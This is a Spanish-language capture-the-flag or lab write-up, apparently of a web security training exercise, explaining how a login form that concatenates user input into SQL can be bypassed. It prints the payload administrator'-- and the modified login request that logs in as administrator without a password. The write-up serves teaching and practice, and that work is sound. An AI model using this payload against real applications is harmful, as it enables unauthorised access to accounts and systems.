# 💉 SQL Injection para bypass de login

## 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **inyección SQL en la funcionalidad de autenticación**.\
La aplicación construye dinámicamente la consulta SQL del login utilizando directamente los valores introducidos por el usuario.

Esto permite manipular la consulta para **eludir la comprobación de contraseña** y autenticarse como otro usuario.

🎯 **Objetivo del laboratorio:**

* Iniciar sesión como el usuario `administrator`
* Explotar una inyección SQL en el formulario de login



## 📚 Teoría

La inyección SQL en formularios de autenticación ocurre cuando la aplicación construye consultas concatenando directamente el input del usuario.

Un ejemplo típico de consulta vulnerable sería:

```sql
SELECT * FROM users WHERE username = 'usuario' AND password = 'contraseña'
```

Si el atacante controla el campo `username`, puede modificar la estructura de la consulta.

El objetivo es:

```
cerrar la cadena SQL
comentar el resto de la consulta
eliminar la validación del password
```

Un payload clásico es:

```
administrator'--
```

Funcionamiento del payload:

```
'   → cierra la cadena del username
--  → comenta el resto de la consulta
```

Esto provoca que el servidor ignore completamente la comprobación de la contraseña.



## 📝 Práctica

### 1️⃣ Interceptar la petición de login

Accedemos al formulario de login y enviamos cualquier combinación de usuario y contraseña.

Interceptamos la petición con **Burp Suite**.

Ejemplo:

```http
POST /login
```

Cuerpo de la petición:

```
username=test
password=test
```

Enviamos la petición a **Burp Repeater** para modificarla.



### 2️⃣ Analizar la consulta vulnerable

El backend ejecuta una consulta similar a:

```sql
SELECT * FROM users WHERE username = 'test' AND password = 'test'
```

Nuestro objetivo es eliminar la comprobación del campo `password`.



### 3️⃣ Inyectar el payload en el campo username

Modificamos el parámetro `username` con el payload:

```
administrator'--
```

La petición queda:

```
username=administrator'--
password=test
```

### 4️⃣ Comportamiento en el servidor

La consulta resultante se convierte en:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'test'
```

El servidor interpreta:

```
'   → cierra la cadena del username
--  → comenta el resto de la consulta
```

Por lo tanto, la consulta efectiva es:

```sql
SELECT * FROM users WHERE username = 'administrator'
```

Si el usuario existe, el login se considera válido.

### 5️⃣ Resultado

Al enviar la petición:

* El servidor devuelve una **cookie de sesión válida**
* Se produce una **redirección a una página autenticada**
* El usuario queda autenticado como `administrator`

Ejemplo de acceso posterior:

```
/admin
/my-account
```

Se consigue:

* Bypass de autenticación mediante SQL Injection
* Acceso a la aplicación como `administrator`

✅ **Laboratorio resuelto.**
